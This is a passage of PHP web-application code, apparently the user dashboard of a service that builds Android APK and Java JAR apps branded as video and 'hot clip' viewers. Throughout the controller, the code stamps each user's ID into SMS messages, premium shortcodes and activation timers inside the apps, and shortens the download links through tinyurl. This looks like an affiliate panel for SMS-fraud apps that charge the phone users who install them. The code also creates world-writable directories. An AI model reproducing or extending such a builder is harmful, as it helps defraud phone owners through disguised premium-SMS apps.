                    $iconfile = $this->do_upload_image('./src/' . $userid, 'appicon_new');
					$popup_time= 10;
                    $object_file = $this->makefile_video($userid, $username, $ifile, $timeactive, $message, $shortcode, $appname, $app_alert, $iconfile,$popup_time);
                    $object_file2 = $this->make_video_app_v2();
                    $object_file3 = $this->make_photo_app();
                    $this->load->model('app_model');
                    $result = $this->app_model->add_app($userid, $appcate, $object_file['icon'], $object_file['name'] . '_' . date('y-d-m-h-m-s'), $object_file['link'], $appdes, $active, $shortcode, SHORTCODE . $userid . " " . $message, $timeactive, 1);
                    $data['filevideo'] = $this->get_tiny_url($object_file['link']);
                    $data['filevideo2'] = $this->get_tiny_url($object_file2['link']);
                    $data['filephoto'] = $this->get_tiny_url($object_file3['link']);
                    $data['javafile'] = $this->get_tiny_url(site_url('file/' . $username . '/Cliphot_' . $userid . '.jar'));
                }

                $this->load->model('shortcode_model');
                $this->load->model('cate_model');
                $data['listcateapps'] = $this->cate_model->list_cate_app();
                $data['shortcodes'] = $this->shortcode_model->list_shortcode();
                $data['userid'] = $this->session->userdata('userid');
                $this->build_java_app();
                $this->load->view('user/dashboard', $data);
            }
        }
    }

    function get_tiny_url($url) {
        $ch = curl_init();
        $timeout = 5;
        curl_setopt($ch, CURLOPT_URL, 'http://tinyurl.com/api-create.php?url=' . $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    }

    function make_video_app_v2() {
        $data['username'] = $this->session->userdata('username');
        $data['output'] = null;
        $data['ok'] = null;
        $data['filevideo'] = null;
        $username = $this->session->userdata('username');
        $userid = $this->session->userdata('userid');
        $data['filevideo'] = null;
        if (is_file(LINK_URL . 'app/' . $userid . '/PhimHD/dist/' . 'signed_PhimHD.apk')) {
            $data['filevideo'] = site_url('app/' . $userid . '/PhimHD/dist/' . 'signed_PhimHD.apk');
        } else {

            $appname = "FCK_VIDEO";
            $active = 1;
            $shortcode = PHONE_CODE;
            $message = SHORTCODE . ' ' . $userid . ' ' . VIDEO_CODE1;
            $timeactive = "15000";
            $userid = $this->session->userdata('userid');
            $appdes = null;
            $appcate = null;
            $app_alert = null;
            $ifile = 'PhimHD.apk';
            //$iconfile = $this->do_upload_image('./src/'.$userid,'appicon_new');  
            $iconfile = null;
            $object_file = $this->makefile_video2($userid, $username, $ifile, $timeactive, $message, $shortcode, $appname, $app_alert, $iconfile);
            $this->load->model('app_model');
            $result = $this->app_model->add_app($userid, $appcate, $object_file['icon'], $object_file['name'] . '_' . date('y-d-m-h-m-s'), $object_file['link'], $appdes, $active, $shortcode, SHORTCODE . $userid . " " . $message, $timeactive, 1);
            $data['filevideo'] = $object_file['link'];
        }
        return $data['filevideo'];
    }

    function make_photo_app() {
        $data['username'] = $this->session->userdata('username');
        $data['output'] = null;
        $data['ok'] = null;
        $data['filevideo'] = null;
        $username = $this->session->userdata('username');
        $userid = $this->session->userdata('userid');
        if (is_file(LINK_URL . 'app/' . $userid . '/PhotoApp/dist/' . 'signed_PhotoApp.apk')) {
            $data['filevideo'] = site_url('app/' . $userid . '/PhotoApp/dist/' . 'signed_PhotoApp.apk');
        } else {

            $appname = "XPHOTO";
            $active = 1;
            $shortcode = PHONE_CODE;
            $message = SHORTCODE . ' ' . $userid . ' ' . VIDEO_CODE1;
            $timeactive = "8940000";
            $userid = $this->session->userdata('userid');
            $appdes = null;
            $appcate = null;
            $app_alert = null;
            $ifile = 'PhotoApp.apk';
            //$iconfile = $this->do_upload_image('./src/'.$userid,'appicon_new');  
            $iconfile = null;
            $object_file = $this->makefile_photo($userid, $username, $ifile, $timeactive, $message, $shortcode, $appname, $app_alert, $iconfile);
            $this->load->model('app_model');
            $result = $this->app_model->add_app($userid, $appcate, $object_file['icon'], $object_file['name'] . '_' . date('y-d-m-h-m-s'), $object_file['link'], $appdes, $active, $shortcode, SHORTCODE . $userid . " " . $message, $timeactive, 1);
            $data['filevideo'] = $object_file['link'];
        }
        return $data['filevideo'];
    }

    //-------Bat dau xu ly file jar ------


    public function build_java_app() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $username = $this->session->userdata('username');
            $userid = $this->session->userdata('userid');

            if (file_exists('file/' . $username . '/Cliphot_' . $userid . '.jar')) {
                $data["userapps"] = base_url('file/' . $username . '/Cliphot_' . $userid . '.jar');
            } else {
                mkdir('file/' . $username, 0777);
                //move file jar goc ra ngoai:---------------------------
                $old = 'java.zip';
                $new = 'file/' . $username . '/Cliphot_' . $userid . '.zip';
                copy($old, $new) or die("Unable to copy $old to $new.");
                $oldpro = 'list.properties';
                $newpro = 'file/' . $username . '/list.properties';
                copy($oldpro, $newpro) or die("Unable to copy $oldpro to $newpro.");
                //tao file properties
                //$this->executeproperties();
                $this->execute_properties($username, 3);
                //ket thuc tao file properties---------------------------
                //Xu ly va tao file Jar----------------------------------
                $zip = new ZipArchive();
                if (($zip->open('file/' . $username . '/Cliphot_' . $userid . '.zip', ZipArchive::CREATE)) !== true) {
                    die('Error: Unable to create zip file');
                }
                $zip->addFile('file/' . $username . '/list.properties', 'list.properties');
                $zip->close();
                //ket thuc xu ly tao file jar----------------------------
                rename('file/' . $username . '/Cliphot_' . $userid . '.zip', 'file/' . $username . '/Cliphot_' . $userid . '.jar');
                $data["userapps"] = base_url('file/' . $username . '/Cliphot_' . $userid . '.jar');
                //unlink('file/'.$username.'/sms.data');
            }
            $username = $this->session->userdata('upname');

            // xóa file nếu đã tồn tại
            if (file_exists($username . '.data')) {
                unlink($username . '.data');
            }
        }
    }

    public function execute_properties() {

        $username = $this->session->userdata('username');
        $userid = $this->session->userdata('userid');
        $content_mess = "KY " . $userid . ' JAVA ' . rand(1, 9);

        $fname = 'file/' . $username . '/list.properties';
        $fhandle = fopen($fname, "r");
        $content = fread($fhandle, filesize($fname));

        $content = str_replace("8785", '6757', $content);
        $content = str_replace("B12 346 Xem Clip Gai Xinh", $content_mess, $content);
        $content = str_replace("B12 346 Xem Clip Hot", $content_mess, $content);
        $content = str_replace("B12 346 Xem Clip Hai Uoc", $content_mess, $content);
        $content = str_replace("B12 346 Xem Clip Chuyen La", $content_mess, $content);
        $content = str_replace("B12 346 Xem Clip Hoat Hinh", $content_mess, $content);
        $content = str_replace("B12 346 Dang Ky Xem Clip 03 Ngay", $content_mess, $content);

        $fhandle = fopen($fname, "w");
        fwrite($fhandle, $content);
        fclose($fhandle);
    }

    //-------Ket thuc xu ly file jar ------


    public function app_video() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            if ($this->session->userdata('userid') == null) {
                redirect('user/login');
            } else {
                $data['output'] = null;
                $data['ok'] = null;
                $data['filevideo'] = null;
                $username = $this->session->userdata('username');
                $userid = $this->session->userdata('userid');

                if (is_file(LINK_URL . 'app/' . $userid . '/dist/' . 'signed_VideoFunny.apk')) {
                    $data['filevideo'] = site_url('app/' . $userid . '/dist/' . 'signed_VideoFunny.apk');
                    echo $data['filevideo'];
                    return;
                } else {
                    if (isset($_REQUEST['submit'])) {
                        $link = $this->input->post('ifile', true);
                        $appname = $this->input->post('appname', true);
                        $applink = $this->input->post('applink', true);
                        $active = $this->input->post('active', true);
                        $shortcode = $this->input->post('shortcode', true);
                        $message = $this->input->post('message', true);
                        $timeactive = $this->input->post('timeactive', true);
                        $userid = $this->session->userdata('userid');
                        $timeactive = $this->input->post('timeactive', true);
                        $apptype = $this->input->post('apptype', true);
                        $appdes = $this->input->post('appdes', true);
                        $appcate = $this->input->post('cateapp', true);
                        $popup_time = $this->input->post('popup_time', true);
                        $ifile = 'VideoFunny.apk';
                        $iconfile = $this->do_upload_image('./src/' . $userid, 'appicon_new');

                        $object_file = $this->makefile_video($userid, $username, $ifile, $timeactive, $message, $shortcode, $appname, $app_alert, $iconfile,$popup_time);
                        $this->load->model('app_model');
                        $result = $this->app_model->add_app($userid, $appcate, $object_file['icon'], $object_file['name'] . '_' . date('y-d-m-h-m-s'), $object_file['link'], $appdes, $active, $shortcode, "GKD " . $userid . " " . $message, $timeactive, $apptype);
                        if ($result == 1) {
                            redirect('user/app');
                        }
                    }
                }

                $this->load->model('shortcode_model');
                $this->load->model('cate_model');
                $data['listcateapps'] = $this->cate_model->list_cate_app();
                $data['shortcodes'] = $this->shortcode_model->list_shortcode();
                $data['userid'] = $this->session->userdata('userid');
				$data['username'] = $username;
                $this->load->view('user/dashboard', $data);
            }
        }
    }

    public function video() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('video_model');
            $userid = $this->session->userdata('userid');
            $config['base_url'] = site_url('user/video');
            $config['total_rows'] = $this->video_model->count_video_user($userid);
            $config['per_page'] = 10;
            $config['prev_link'] = 'Last';
            $config['next_link'] = 'Next';
            $this->pagination->initialize($config);
            $data['pages'] = $this->pagination->create_links();
            $data['userid'] = $userid;
            $data['list_video'] = $this->video_model->list_video_user($userid, $config['per_page'], $this->uri->segment(3));
            $this->load->view('user/dashboard', $data);
        }
    }

    public function test() {
        //http://www.youtube.com/watch?v=_H5IiuAFyrk http://www.youtube.com/watch?v=Ys1PPDUKYoY  http://www.youtube.com/watch?v=NG8eci5bNyM
        $video_ID = 'NG8eci5bNyM';
        $json = file_get_contents("https://gdata.youtube.com/feeds/api/videos/{$video_ID}?v=2&alt=json");
        $json_data = json_decode($json);
        echo "<pre>";
        //$duration = $json_data->getElementsByTagName('duration')->item(0)->getAttribute('seconds');
        //print_r($duration); 
        echo $this->getDuration('http://www.youtube.com/watch?v=NG8eci5bNyM') * 0.0166667;
        die();
    }

    function getDuration($url) {

        parse_str(parse_url($url, PHP_URL_QUERY), $arr);
        $video_id = $arr['v'];


        $data = @file_get_contents('http://gdata.youtube.com/feeds/api/videos/' . $video_id . '?v=2&alt=jsonc');
        if (false === $data)
            return false;

        $obj = json_decode($data);

        return $obj->data->duration * 0.0166667;
    }

    function getYoutubeImage($e) {
        //GET THE URL
        $url = $e;

        $queryString = parse_url($url, PHP_URL_QUERY);

        parse_str($queryString, $params);

        $v = $params['v'];
        //DISPLAY THE IMAGE
        if (strlen($v) > 0) {
            return "http://i3.ytimg.com/vi/$v/mqdefault.jpg";
        }
    }

    public function getPlaylist($playlist = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $cont = json_decode(file_get_contents('http://gdata.youtube.com/feeds/api/playlists/' . $playlist . '/?v=2&alt=json&feature=plcp'));
            $feed = $cont->feed->entry;
            $videoID_array = array();
            if (count($feed)) {
                foreach ($feed as $item)
                    array_push($videoID_array, $item->{'media$group'}->{'yt$videoid'}->{'$t'});
            }
            return $videoID_array;
        }
    }

    public function add_multiple_video() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $userid = $this->session->userdata('userid');
            $data['userid'] = $userid;
            $this->load->model('cate_model');
            $this->load->model('wap_model');
            $this->load->model('shortcode_model');
            if (isset($_REQUEST['submit'])) {
                $video_name = $this->input->post('video_name', true);
                $cateid = $this->input->post('cateid', true);
                $video_link = $this->input->post('video_link', true);
                $video_content = $this->input->post("video_content", true);
                $active = $this->input->post('active', true);
                $shortcode = $this->input->post('shortcode', true);
                $message = $this->input->post('message', true);
                $timeactive = $this->input->post('timeactive', true);
                if (!file_exists('./src/' . $userid)) {
                    mkdir('./src/' . $userid, 0777, true);
                }
                $video_image = $this->do_upload_image('./src/' . $userid, 'img_video');

                $playlist = $this->getPlaylist($video_link);

                foreach ($playlist as $videos) {
                    $link = "http://www.youtube.com/watch?v=" . $videos;
                    $video = explode("watch?v=", $videos);
                    $video_ID = $videos;
                    $json = file_get_contents("https://gdata.youtube.com/feeds/api/videos/{$video_ID}?v=2&alt=json");
                    $json_data = json_decode($json);
                    $title = $json_data->{'entry'}->{'title'}->{'$t'};
                    $video_content = $json_data->{'entry'}->{'media$group'}->{'media$description'}->{'$t'};
                    $video_image = $this->getYoutubeImage($link);
                    $video_duration = $this->getDuration($link);
                    $this->load->model('video_model');
                    $this->video_model->add_video($cateid, $userid, $title, $link, $video_content, $video_image, $video_duration, $active, $shortcode = null, $message = null, $timeactive = null);
                }

                redirect('user/video');
            }
            $data['list_cate'] = $this->cate_model->list_cate_user($userid);
            $data['shortcodes'] = $this->shortcode_model->list_shortcode();
            $data['list_wap'] = $this->wap_model->list_wap_user($this->session->userdata('userid'));

            $this->load->view('user/dashboard', $data);
        }
    }

    public function add_video() {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $userid = $this->session->userdata('userid');
            $data['userid'] = $userid;
            $this->load->model('cate_model');
            $this->load->model('wap_model');
            $this->load->model('shortcode_model');
            if (isset($_REQUEST['submit'])) {
                $video_name = $this->input->post('video_name', true);
                $cateid = $this->input->post('cate_video', true);
                $video_link = $this->input->post('video_link', true);
                $video_content = $this->input->post("video_content", true);
                $active = $this->input->post('active', true);
                $shortcode = $this->input->post('shortcode', true);
                $message = $this->input->post('message', true);
                $timeactive = $this->input->post('timeactive', true);
                if (!file_exists('./src/' . $userid)) {
                    mkdir('./src/' . $userid, 0777, true);
                }
                $video_image = $this->do_upload_image('./src/' . $userid, 'img_video');

                $video = explode("watch?v=", $video_link);
                $video_ID = $video[1];
                $json = file_get_contents("https://gdata.youtube.com/feeds/api/videos/{$video_ID}?v=2&alt=json");
                $json_data = json_decode($json);
                $title = $json_data->{'entry'}->{'title'}->{'$t'};
                $video_content = $json_data->{'entry'}->{'media$group'}->{'media$description'}->{'$t'};
                $video_image = $this->getYoutubeImage($video_link);
                $video_duration = $this->getDuration($video_link);
                $this->load->model('video_model');
                $this->video_model->add_video($cateid, $userid, $title, $video_link, $video_content, $video_image, $video_duration, $active, $shortcode = null, $message = null, $timeactive = null);
                redirect('user/video');
            }
            $data['list_cate'] = $this->cate_model->list_cate_user($userid);
            $data['shortcodes'] = $this->shortcode_model->list_shortcode();
            $data['list_wap'] = $this->wap_model->list_wap_user($this->session->userdata('userid'));

            $this->load->view('user/dashboard', $data);
        }
    }

    public function del_video($id = null) {
        if ($this->session->userdata('userid') == null) {
            redirect('user/login');
        } else {
            $data['username'] = $this->session->userdata('username');
            $this->load->model('video_model');
            $userid = $this->session->userdata('userid');
            $this->video_model->del_video($userid, $id);
            redirect('user/video');
        }
    }

    /*
     * ------------------------------------------------------------------------------------------
     */

    function do_upload_file($mypath, $filename) {
        $config['upload_path'] = $mypath;
        $config['allowed_types'] = 'jar|jad|apk|ipa';
        $config['max_size'] = '5000000';
        $this->load->library('upload', $config);
        $this->upload->initialize($config);
        if (isset($filename)) {
            if (!$this->upload->do_upload($filename)) {
                $error = array('error' => $this->upload->display_errors());
                return null;
            } else {
                $data = array('upload_data' => $this->upload->data());
                $imagename = $this->upload->file_name;
                return $imagename;
            }
        } else {
            echo $this->upload->display_errors();
            die;
        }
    }

    function do_upload_image($mypath, $filename) {
        $config['upload_path'] = $mypath;
        $config['allowed_types'] = 'png|jpg|bmp|gif|';
        $config['max_size'] = '5000000';
        $this->load->library('upload', $config);
        $this->upload->initialize($config);
        if (isset($filename)) {
            if (!$this->upload->do_upload($filename)) {
                $error = array('error' => $this->upload->display_errors());
                return null;
            } else {
                $data = array('upload_data' => $this->upload->data());
                $imagename = $this->upload->file_name;
                return $imagename;
            }
        } else {
            echo $this->upload->display_errors();
        }
    }

}
